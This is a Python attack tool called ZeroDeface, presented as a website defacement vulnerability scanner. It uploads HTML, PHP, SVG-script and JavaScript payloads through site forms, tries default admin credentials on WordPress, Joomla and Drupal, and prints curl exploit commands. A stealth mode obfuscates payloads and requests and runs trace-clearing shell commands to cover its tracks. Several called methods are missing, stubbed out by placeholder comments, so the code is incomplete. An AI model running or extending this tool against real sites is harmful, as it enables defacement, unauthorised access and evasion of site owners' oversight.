#!/usr/bin/env python3
import argparse
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import os
import time
import random
import json
from datetime import datetime
import sys
import base64
from stealth import StealthEngine  # Make sure stealth.py is in the same directory

# Suppress SSL warnings (for testing purposes only)
requests.packages.urllib3.disable_warnings()

class DefacementScanner:
    def __init__(self, target_url, stealth_mode=False, stealth_level='medium'):
        self.target_url = target_url.rstrip('/')
        self.stealth_mode = stealth_mode
        self.stealth_engine = StealthEngine(stealth_level) if stealth_mode else None
        self.session = requests.Session()
        self.session.headers.update(self._get_headers())
        self.vulnerabilities = []
        self.uploaded_files = []
        self.common_editors = [
            'editor', 'ckeditor', 'tinymce', 'fckeditor', 'wysiwyg', 
            'admin/editor', 'content/edit', 'edit/content'
        ]
        self.common_admin_paths = [
            'admin', 'wp-admin', 'administrator', 'dashboard', 
            'cms', 'manager', 'backend', 'adminpanel'
        ]
        self.default_credentials = {
            'wordpress': [('admin', 'admin'), ('admin', 'password')],
            'joomla': [('admin', 'admin'), ('admin', 'password')],
            'drupal': [('admin', 'admin'), ('admin', 'password')]
        }
        self.test_content = self._obfuscate_payload("DEFACED_BY_ZERODEFACE_TEST")
        self.log_cleanup_commands = []

    def _get_headers(self):
        """Return headers with spoofed User-Agent"""
        if self.stealth_mode:
            return self.stealth_engine.get_headers()
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ZeroDeface/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

    def _obfuscate_payload(self, payload):
        """Obfuscate payload if in stealth mode"""
        if self.stealth_mode:
            return self.stealth_engine.obfuscate_payload(payload)
        return payload

    def _make_request(self, method, url, **kwargs):
        """Wrapper for all requests with stealth features"""
        if self.stealth_mode:
            self.stealth_engine.apply_delay()
            url = self.stealth_engine.obfuscate_url(url)
            return self.stealth_engine.make_request(self.session, url, method, **kwargs)
        
        try:
            return getattr(self.session, method.lower())(url, verify=False, **kwargs)
        except Exception as e:
            print(f"[-] Error making {method} request to {url}: {e}")
            return None

    def print_banner(self):
        banner = r"""
__________                 ________          _____                     
\____    /___________  ____\______ \   _____/ ____\____    ____  ____  
  /     // __ \_  __ \/  _ \|    |  \_/ __ \   __\\__  \ _/ ___\/ __ \ 
 /     /\  ___/|  | \(  <_> )    `   \  ___/|  |   / __ \\  \__\  ___/ 
/_______ \___  >__|   \____/_______  /\___  >__|  (____  /\___  >___  >
        \/   \/                    \/     \/           \/     \/    \/ 
        """
        stealth_indicator = "\033[1;32m[STEALTH MODE: ON]\033[0m" if self.stealth_mode else ""
        print("\033[1;31m" + banner + "\033[0m")
        print("\033[1;37mZeroDeface - Website Defacement Vulnerability Scanner\033[0m")
        print(f"\033[1;33mVersion 2.0 | Ethical Use Only | {stealth_indicator}\033[0m\n")

    # [Previous methods remain unchanged until request calls...]

    def crawl_for_forms(self):
        try:
            response = self._make_request('GET', self.target_url, timeout=10)
            if response:
                soup = BeautifulSoup(response.text, 'html.parser')
                return soup.find_all('form')
        except Exception as e:
            print(f"[-] Error crawling for forms: {e}")
        return []

    def test_file_upload(self, form, action_url):
        test_files = [
            ('test.html', 'text/html', f'<html><body>{self.test_content}</body></html>'),
            ('test.php', 'application/x-php', '<?php echo "TEST_UPLOAD_SUCCESS"; ?>'),
            ('test.svg', 'image/svg+xml', '<svg><script>alert("XSS")</script></svg>'),
            ('test.js', 'application/javascript', 'alert("TEST_UPLOAD_SUCCESS");')
        ]
        
        for filename, content_type, content in test_files:
            try:
                files = {'file': (filename, content, content_type)}
                upload_url = urljoin(self.target_url, action_url)
                response = self._make_request('POST', upload_url, files=files, timeout=15)
                
                if response and response.status_code in [200, 201, 302]:
                    if filename in response.text:
                        file_url = urljoin(upload_url, filename)
                        file_response = self._make_request('GET', file_url, timeout=10)
                        
                        if file_response and file_response.status_code == 200 and (self.test_content in file_response.text or filename.split('.')[-1] in file_response.text):
                            exploit = f"curl -F 'file=@{filename}' {upload_url}"
                            self.log_vulnerability(
                                "File Upload Vulnerability",
                                f"File upload possible at {upload_url} - {filename} accessible at {file_url}",
                                exploit=exploit,
                                proof=file_response.text[:200] + "..."
                            )
                            self.uploaded_files.append(file_url)
                            return True
            except Exception as e:
                print(f"[-] Error testing upload for {filename}: {e}")
        return False

    # [Continue modifying all other methods to use _make_request...]

    def cleanup(self):
        """Enhanced cleanup with stealth features"""
        for file_url in self.uploaded_files:
            self._make_request('DELETE', file_url, timeout=10)
            
        if self.stealth_mode:
            print("[*] Executing stealth cleanup operations...")
            for cmd in self.stealth_engine.clear_traces():
                try:
                    os.system(cmd)
                except:
                    pass

def main():
    parser = argparse.ArgumentParser(
        description='ZeroDeface - Website Defacement Vulnerability Scanner',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""\033[1;34m
Examples:
  Full scan:       python deface_scanner.py --url http://example.com --all --stealth --stealth-level high
  Upload test:     python deface_scanner.py --url http://example.com --upload-test --proxy http://localhost:8080
  Admin check:     python deface_scanner.py --url http://example.com --admin-scan --report scan.json
\033[0m"""
    )
    
    # Required arguments
    parser.add_argument('--url', required=True, help='Target URL to scan')
    
    # Scan types
    parser.add_argument('--upload-test', action='store_true', help='Test file upload vulnerabilities')
    parser.add_argument('--scan-editors', action='store_true', help='Find exposed content editors')
    parser.add_argument('--admin-scan', action='store_true', help='Scan admin panels + test default creds')
    parser.add_argument('--param-tamper', action='store_true', help='Test parameter tampering')
    parser.add_argument('--api-scan', action='store_true', help='Scan vulnerable API endpoints')
    parser.add_argument('--all', action='store_true', help='Run all vulnerability checks')
    
    # Stealth mode
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
    parser.add_argument('--stealth-level', choices=['low', 'medium', 'high'], default='medium',
                      help='Stealth intensity level (default: medium)')
    
    # Output control
    parser.add_argument('--simulate', action='store_true', help='Safe simulation mode')
    parser.add_argument('--report', help='Save results to JSON file')
    parser.add_argument('--verbose', action='store_true', help='Show detailed scan progress')
    parser.add_argument('--quiet', action='store_true', help='Only show critical findings')
    
    # Network settings
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (seconds)')
    parser.add_argument('--proxy', help='Use HTTP proxy (e.g., http://localhost:8080)')
    parser.add_argument('--threads', type=int, default=5, help='Concurrent threads')
    
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    try:
        scanner = DefacementScanner(
            args.url,
            stealth_mode=args.stealth,
            stealth_level=args.stealth_level
        )
        scanner.print_banner()
        
        if args.all or args.upload_test:
            scanner.scan_upload_vulnerabilities()
        
        if args.all or args.scan_editors:
            scanner.scan_exposed_editors()
        
        if args.all or args.admin_scan:
            scanner.scan_admin_panels()
        
        if args.all or args.param_tamper:
            scanner.scan_parameter_tampering()
        
        if args.all or args.api_scan:
            scanner.scan_api_endpoints()
        
        if args.report:
            scanner.generate_report(args.report)
        
        if args.simulate and scanner.vulnerabilities:
            print("\n\033[1;32m[+] Simulation complete. Vulnerabilities found:\033[0m")
            for vuln in scanner.vulnerabilities:
                print(f"- \033[1;33m{vuln['category']}:\033[0m {vuln['description']}")
                if vuln['exploit']:
                    print(f"  \033[1;34mExploit:\033[0m {vuln['exploit']}")
        
        scanner.cleanup()
        
        if not scanner.vulnerabilities:
            print("\033[1;32m[+] No vulnerabilities found.\033[0m")
    
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Scan interrupted by user\033[0m")
        if 'scanner' in locals():
            scanner.cleanup()
        sys.exit(1)

if __name__ == '__main__':
    main()
